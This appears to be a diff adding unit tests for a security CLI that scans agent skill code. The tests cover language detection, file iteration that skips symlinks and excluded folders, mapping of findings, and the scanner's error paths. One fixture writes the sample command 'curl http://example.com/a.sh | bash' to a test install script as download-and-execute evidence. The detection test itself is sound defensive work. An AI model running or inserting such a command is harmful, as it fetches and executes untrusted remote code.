@@ -9,14 +9,32 @@ These tests protect:
 """
 
 import unittest
+from pathlib import Path
+from tempfile import TemporaryDirectory
+from unittest.mock import patch
 
-from agent_sec_cli.skill_ledger.core.certifier import _determine_scan_status
+from agent_sec_cli.code_scanner.models import (
+    Finding,
+    Language,
+    ScanResult,
+    Severity,
+    Verdict,
+)
+from agent_sec_cli.skill_ledger.core.certifier import (
+    _auto_invoke_scanners,
+    _determine_scan_status,
+)
 from agent_sec_cli.skill_ledger.models.finding import NormalizedFinding
 from agent_sec_cli.skill_ledger.scanner.parsers import parse_findings
 from agent_sec_cli.skill_ledger.scanner.registry import (
     ParserInfo,
-    ScannerInfo,
     ScannerRegistry,
+)
+from agent_sec_cli.skill_ledger.scanner.skill_code_scanner import (
+    SCANNER_VERSION,
+    detect_language,
+    iter_code_files,
+    scan_skill_code,
 )
 
 
@@ -207,6 +225,255 @@ class TestDetermineStatusFromFindings(unittest.TestCase):
             NormalizedFinding(rule="r2", level="warn", message="iffy"),
         ]
         self.assertEqual(_determine_scan_status(findings), "warn")
+
+
+class TestSkillCodeScannerAdapter(unittest.TestCase):
+    """Skill-level adapter around the independent code_scanner package."""
+
+    def _write(self, root: Path, rel: str, content: str | bytes) -> Path:
+        path = root / rel
+        path.parent.mkdir(parents=True, exist_ok=True)
+        if isinstance(content, bytes):
+            path.write_bytes(content)
+        else:
+            path.write_text(content, encoding="utf-8")
+        return path
+
+    def test_language_detection_by_extension_and_shebang(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp).resolve()
+            py = self._write(root, "main.py", "print('hello')\n")
+            sh = self._write(root, "run.sh", "echo hello\n")
+            bash = self._write(root, "tool", "#!/usr/bin/env bash\necho hello\n")
+            python = self._write(root, "worker", "#!/usr/bin/env python3\nprint(1)\n")
+            text = self._write(root, "README.md", "# docs\n")
+
+            self.assertEqual(detect_language(py), Language.PYTHON)
+            self.assertEqual(detect_language(sh), Language.BASH)
+            self.assertEqual(detect_language(bash), Language.BASH)
+            self.assertEqual(detect_language(python), Language.PYTHON)
+            self.assertIsNone(detect_language(text))
+
+    def test_iter_code_files_skips_excluded_dirs_and_symlinks(self) -> None:
+        with TemporaryDirectory() as tmp:
+            base = Path(tmp).resolve()
+            root = base / "skill"
+            root.mkdir()
+            self._write(root, "main.py", "print('hello')\n")
+            self._write(root, ".skill-meta/hidden.py", "print('skip')\n")
+            self._write(root, "node_modules/pkg/script.sh", "echo skip\n")
+            self._write(root, "notes.txt", "plain text\n")
+            target = self._write(root, "target.py", "print('skip symlink')\n")
+            symlink = root / "linked.py"
+            symlink_dir = root / "linked-dir"
+            outside = base / "outside"
+            try:
+                symlink.symlink_to(target)
+            except OSError:
+                symlink = None
+            try:
+                outside.mkdir()
+                self._write(outside, "escaped.py", "print('escape')\n")
+                symlink_dir.symlink_to(outside, target_is_directory=True)
+            except OSError:
+                symlink_dir = None
+
+            files = {
+                (path.relative_to(root).as_posix(), language)
+                for path, language in iter_code_files(root)
+            }
+
+            self.assertIn(("main.py", Language.PYTHON), files)
+            self.assertIn(("target.py", Language.PYTHON), files)
+            self.assertNotIn((".skill-meta/hidden.py", Language.PYTHON), files)
+            self.assertNotIn(("node_modules/pkg/script.sh", Language.BASH), files)
+            self.assertNotIn(("notes.txt", Language.BASH), files)
+            if symlink is not None:
+                self.assertNotIn(("linked.py", Language.PYTHON), files)
+            if symlink_dir is not None:
+                self.assertNotIn(("linked-dir/escaped.py", Language.PYTHON), files)
+
+    def test_empty_code_file_is_skipped(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp).resolve()
+            self._write(root, "empty.py", "   \n\t")
+
+            self.assertEqual(scan_skill_code(root), [])
+
+    def test_code_scanner_finding_is_mapped_to_normalized_finding(self) -> None:
+        scan_result = ScanResult(
+            ok=True,
+            verdict=Verdict.WARN,
+            summary="Detected 1 issue(s)",
+            findings=[
+                Finding(
+                    rule_id="shell-download-exec",
+                    severity=Severity.WARN,
+                    desc_zh="下载并执行远程脚本",
+                    desc_en="download and execute",
+                    evidence=["curl http://example.com/a.sh | bash"],
+                )
+            ],
+            language=Language.BASH,
+            engine_version="test-version",
+            elapsed_ms=3,
+        )
+
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp).resolve()
+            self._write(
+                root, "scripts/install.sh", "curl http://example.com/a.sh | bash\n"
+            )
+            with patch(
+                "agent_sec_cli.skill_ledger.scanner.skill_code_scanner.scan",
+                return_value=scan_result,
+            ):
+                findings = scan_skill_code(root)
+
+        self.assertEqual(len(findings), 1)
+        finding = findings[0]
+        self.assertEqual(finding["rule"], "shell-download-exec")
+        self.assertEqual(finding["level"], "warn")
+        self.assertEqual(finding["message"], "下载并执行远程脚本")
+        self.assertEqual(finding["file"], "scripts/install.sh")
+        self.assertEqual(finding["metadata"]["source"], "code-scanner")
+        self.assertEqual(finding["metadata"]["language"], "bash")
+        self.assertEqual(finding["metadata"]["engine_version"], "test-version")
+        self.assertEqual(
+            finding["metadata"]["evidence"],
+            ["curl http://example.com/a.sh | bash"],
+        )
+
+    def test_scan_error_becomes_warn_finding(self) -> None:
+        scan_result = ScanResult(
+            ok=False,
+            verdict=Verdict.ERROR,
+            summary="scan error: internal error",
+            findings=[],
+            language=Language.PYTHON,
+            elapsed_ms=1,
+        )
+
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp).resolve()
+            self._write(root, "main.py", "print('hello')\n")
+            with patch(
+                "agent_sec_cli.skill_ledger.scanner.skill_code_scanner.scan",
+                return_value=scan_result,
+            ):
+                findings = scan_skill_code(root)
+
+        self.assertEqual(len(findings), 1)
+        self.assertEqual(findings[0]["rule"], "code-scanner-error")
+        self.assertEqual(findings[0]["level"], "warn")
+        self.assertEqual(findings[0]["file"], "main.py")
+        self.assertIn("scan error", findings[0]["metadata"]["error"])
+        self.assertNotIn("max_file_bytes", findings[0]["metadata"])
+
+    def test_unexpected_scan_exception_becomes_warn_finding(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp).resolve()
+            self._write(root, "main.py", "print('hello')\n")
+            with patch(
+                "agent_sec_cli.skill_ledger.scanner.skill_code_scanner.scan",
+                side_effect=RuntimeError("rule load failed"),
+            ):
+                findings = scan_skill_code(root)
+
+        self.assertEqual(len(findings), 1)
+        self.assertEqual(findings[0]["rule"], "code-scanner-error")
+        self.assertEqual(findings[0]["level"], "warn")
+        self.assertEqual(findings[0]["file"], "main.py")
+        self.assertIn("RuntimeError", findings[0]["metadata"]["error"])
+        self.assertIn("rule load failed", findings[0]["metadata"]["error"])
+
+    def test_large_file_becomes_warn_finding(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp).resolve()
+            self._write(root, "large.py", "x" * (1024 * 1024 + 1))
+            with patch(
+                "agent_sec_cli.skill_ledger.scanner.skill_code_scanner.scan"
+            ) as mocked_scan:
+                findings = scan_skill_code(root)
+
+        mocked_scan.assert_not_called()
+        self.assertEqual(len(findings), 1)
+        self.assertEqual(findings[0]["rule"], "code-scanner-error")
+        self.assertEqual(findings[0]["level"], "warn")
+        self.assertIn("file too large", findings[0]["metadata"]["error"])
+        self.assertEqual(findings[0]["metadata"]["max_file_bytes"], 1024 * 1024)
+
+
+class TestAutoInvokeSkillCodeScanner(unittest.TestCase):
+    """Auto-invoke dispatch for the built-in skill-code-scanner adapter."""
+
+    def _registry(self) -> ScannerRegistry:
+        return ScannerRegistry.from_config(
+            {
+                "scanners": [
+                    {
+                        "name": "skill-code-scanner",
+                        "type": "builtin",
+                        "parser": "findings-array",
+                        "enabled": True,
+                    }
+                ],
+                "parsers": {"findings-array": {"type": "findings-array"}},
+            }
+        )
+
+    def test_auto_invoke_empty_findings_produces_pass_entry(self) -> None:
+        with (
+            TemporaryDirectory() as tmp,
+            patch(
+                "agent_sec_cli.skill_ledger.core.certifier.skill_code_scanner.scan_skill_code",
+                return_value=[],
+            ),
+        ):
+            entries = _auto_invoke_scanners(tmp, self._registry())
+
+        self.assertEqual(len(entries), 1)
+        self.assertEqual(entries[0].scanner, "skill-code-scanner")
+        self.assertEqual(entries[0].version, SCANNER_VERSION)
+        self.assertEqual(entries[0].status, "pass")
+        self.assertEqual(entries[0].findings, [])
+
+    def test_auto_invoke_warn_and_deny_statuses(self) -> None:
+        cases = [
+            ([{"rule": "r1", "level": "warn", "message": "warn"}], "warn"),
+            ([{"rule": "r2", "level": "deny", "message": "deny"}], "deny"),
+        ]
+        for raw_findings, expected_status in cases:
+            with (
+                self.subTest(expected_status=expected_status),
+                TemporaryDirectory() as tmp,
+                patch(
+                    "agent_sec_cli.skill_ledger.core.certifier.skill_code_scanner.scan_skill_code",
+                    return_value=raw_findings,
+                ),
+            ):
+                entries = _auto_invoke_scanners(tmp, self._registry())
+
+            self.assertEqual(len(entries), 1)
+            self.assertEqual(entries[0].status, expected_status)
+            self.assertEqual(entries[0].findings[0]["rule"], raw_findings[0]["rule"])
+
+    def test_auto_invoke_honors_scanner_name_filter(self) -> None:
+        with (
+            TemporaryDirectory() as tmp,
+            patch(
+                "agent_sec_cli.skill_ledger.core.certifier.skill_code_scanner.scan_skill_code",
+                return_value=[],
+            ) as mocked_scan,
+        ):
+            entries = _auto_invoke_scanners(
+                tmp,
+                self._registry(),
+                scanner_names=["other-scanner"],
+            )
+
+        self.assertEqual(entries, [])
+        mocked_scan.assert_not_called()
 
 
 if __name__ == "__main__":
